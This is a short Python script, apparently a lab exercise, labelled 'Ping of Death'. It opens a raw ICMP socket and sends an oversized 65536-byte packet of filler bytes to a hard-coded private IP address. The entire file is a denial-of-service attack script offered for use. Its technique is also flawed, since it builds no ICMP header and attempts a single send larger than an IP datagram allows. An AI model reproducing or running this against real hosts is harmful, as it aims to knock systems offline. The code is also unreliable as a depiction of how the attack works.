#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Description:
    Ping of Death
"""

import socket

def send_pod_attack(target_ip):
    """
    Send oversized ICMP packets to simulate Ping of Death
    """
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

        # Define an oversized packet
        # Exceeds maximum allowable size
        oversized_packet = b"A" * 65536

        # Send the packet to the target
        sock.sendto(oversized_packet, (target_ip, 1))

        print(f"Ping of Death packet send to {target_ip}")
    except Exception as e:
        print(f"[-]ERROR: {e}")


def main():
    target_ip = "172.16.104.1"
    send_pod_attack(target_ip)

    
if __name__ == "__main__":
    main()

